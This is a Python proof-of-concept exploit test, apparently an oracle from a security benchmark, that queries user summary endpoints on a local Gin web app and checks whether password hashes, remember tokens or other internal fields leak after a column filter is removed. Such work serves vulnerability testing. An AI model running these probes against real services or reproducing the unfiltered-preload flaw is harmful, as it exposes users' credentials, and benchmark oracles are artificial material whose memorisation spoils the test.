"""PoC exploit: 3-stage user summary preload leak — removes Cols() filter, exposes full ZUsers entity including Password (CWE-200)."""

from mosaic.oracle.exploit import ExploitTest


class PreloadLeakExploit(ExploitTest):
    """User summary leak: Password field exposed after Cols() removal."""

    def __init__(self, base_url: str = "http://localhost:39081"):
        super().__init__(base_url)

    @property
    def chain_id(self) -> str:
        return "gin_association_preload_leak"

    def setup(self) -> None:
        """No setup needed — public API."""
        pass

    def execute(self) -> tuple[bool, str]:
        """Fetch user summary and check for leaked Password field."""
        # Try user IDs 1-5
        for user_id in range(1, 6):
            resp = self.http_get(f"/api/users/{user_id}/summary")

            if resp.status_code == 404:
                continue
            if not resp.ok:
                continue

            try:
                data = resp.json()
            except Exception:
                continue

            # Navigate Gin blog response format
            payload = data.get("data", data)
            if isinstance(payload, dict):
                item = payload
            elif isinstance(payload, list) and payload:
                item = payload[0]
            else:
                continue

            if not isinstance(item, dict):
                continue

            # Check for Password field
            val = item.get("Password") or item.get("password")
            if val and isinstance(val, str) and len(val) > 5:
                is_bcrypt = str(val).startswith("$2")
                evidence = f"{'Password' if 'Password' in item else 'password'} field exposed: '{str(val)[:30]}...'"
                if is_bcrypt:
                    evidence += " (bcrypt hash detected)"
                return True, f"Data leaked at /api/users/{user_id}/summary (CWE-200). {evidence}"

            # Check for Status or RememberToken (other internal fields)
            if "Status" in item or "status" in item or "RememberToken" in item:
                leaked = [k for k in item.keys() if k not in ("name", "email", "post_count", "Name", "Email")]
                return True, f"Internal fields leaked at /api/users/{user_id}/summary: {leaked}"

            field_names = list(item.keys())
            # If we have more than expected safe fields, it's a leak
            if len(field_names) > 4:
                return True, f"Excess fields at /api/users/{user_id}/summary: {field_names}"

            return False, f"User {user_id} has only safe fields. Keys: {field_names}"

        return False, "No users found at /api/users/1-5/summary"
